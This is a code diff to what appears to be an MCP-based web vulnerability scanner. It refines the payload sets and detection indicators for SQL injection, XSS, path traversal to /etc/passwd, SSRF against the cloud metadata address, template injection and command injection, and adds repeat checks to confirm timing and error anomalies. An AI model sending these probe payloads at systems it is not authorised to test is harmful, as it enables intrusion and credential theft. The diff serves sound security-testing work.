@@ -676,11 +676,21 @@ def register(mcp: FastMCP):
             targets: [{"path": "/api/users", "parameter": "id", "method": "GET"}] - auto-discover if None
             max_endpoints: Max endpoints to test (default 10)
         """
-        # Quick payload sets per vulnerability type
+        # Quick payload sets per vulnerability type.
+        # Indicators must be specific enough to survive an "is this string also
+        # in the baseline?" check. Generic words like "sql", "type", or small
+        # numbers are rejected — they false-positive on docs, error pages, and
+        # UI templates.
         payload_sets = {
             "sqli": {
-                "payloads": ["'", "1 OR 1=1--", "1' AND SLEEP(3)--", "1 UNION SELECT NULL--"],
-                "indicators": ["sql", "syntax", "mysql", "ora-", "postgresql", "sqlite", "unclosed quotation"],
+                # Tautology "1 OR 1=1" skipped — it can alter row matches on
+                # UPDATE/DELETE endpoints (rule 8). Boolean OR 1=1 is still
+                # demonstrable via the UNION/error-based probes below.
+                "payloads": ["'", "\"", "1' AND SLEEP(3)--", "1 UNION SELECT NULL--"],
+                "indicators": ["you have an error in your sql syntax", "ora-00933",
+                               "ora-01756", "syntax error at or near",
+                               "unclosed quotation mark", "mysql_fetch",
+                               "sqlite_error", "pg_query"],
             },
             "xss": {
                 "payloads": ["<script>alert(1)</script>", "\" onmouseover=alert(1)", "<img src=x onerror=alert(1)>", "'-alert(1)-'"],
@@ -688,7 +698,10 @@ def register(mcp: FastMCP):
             },
             "lfi": {
                 "payloads": ["../../../etc/passwd", "....//....//....//etc/passwd", "..%252f..%252f..%252fetc/passwd", "/etc/passwd"],
-                "indicators": ["root:x:", "root:*:", "/bin/bash", "/bin/sh"],
+                # Strong /etc/passwd markers only. Weak markers like "/bin/bash"
+                # match docs and man pages.
+                "indicators": ["root:x:0:0:", "root:!:0:0:", "root:*:0:0:",
+                               "daemon:x:1:", "nobody:x:"],
             },
             "open_redirect": {
                 "payloads": [],  # Populated dynamically with Collaborator URL
@@ -697,11 +710,17 @@ def register(mcp: FastMCP):
             },
             "ssrf": {
                 "payloads": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22", "http://[::1]/"],
-                "indicators": ["ami-id", "instance-id", "ssh", "openssl"],
+                # "ssh" and "openssl" drop — too generic. Require specific
+                # metadata or banner strings.
+                "indicators": ["ami-id", "instance-id", "iam/security-credentials",
+                               "SSH-2.0-", "SSH-1.99-"],
             },
             "ssti": {
-                "payloads": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
-                "indicators": ["49"],  # 7*7=49
+                # 7777*7777 = 60481729 — unique enough that no legitimate page
+                # contains it, beats the "49" false-positive where any product
+                # price or pagination number matches.
+                "payloads": ["{{7777*7777}}", "${7777*7777}", "<%= 7777*7777 %>", "#{7777*7777}"],
+                "indicators": ["60481729"],
             },
             "command_injection": {
                 "payloads": ["; id", "| id", "$(id)", "`id`"],
@@ -807,13 +826,33 @@ def register(mcp: FastMCP):
                         if h["name"].lower() == "location" and collab_host in h["value"]:
                             finding_reasons.append(f"redirect to Collaborator: {h['value'][:50]}")
 
-                # Check timing anomaly
+                # Check timing anomaly. Rule 11: never trust a single slow
+                # response — network noise triggers false positives. For SLEEP
+                # payloads, re-send twice more and require both repeats to
+                # also breach the 3s threshold before flagging.
                 if time_ms > 3000 and "SLEEP" in payload.upper():
-                    finding_reasons.append(f"timing: {time_ms}ms")
+                    confirmed = 1
+                    for _ in range(2):
+                        verify_resp = await client.post("/api/session/request", json={
+                            "session": session, "method": t_method, "path": inject_path,
+                        })
+                        if "error" in verify_resp:
+                            break
+                        total_requests += 1
+                        if verify_resp.get("time_ms", 0) > 3000:
+                            confirmed += 1
+                    if confirmed >= 3:
+                        finding_reasons.append(f"timing: {time_ms}ms (3/3 iterations)")
 
-                # Status anomaly
+                # Status anomaly. Require consecutive 500s — single transient
+                # 500 is common noise and doesn't prove injection.
                 if status == 500 and baseline_status != 500:
-                    finding_reasons.append("500 error (possible injection)")
+                    verify_resp = await client.post("/api/session/request", json={
+                        "session": session, "method": t_method, "path": inject_path,
+                    })
+                    total_requests += 1
+                    if "error" not in verify_resp and verify_resp.get("status", 0) == 500:
+                        finding_reasons.append("500 error (consistent, possible injection)")
 
                 if finding_reasons:
                     severity = "HIGH" if any("indicator" in r or "timing" in r for r in finding_reasons) else "MEDIUM"
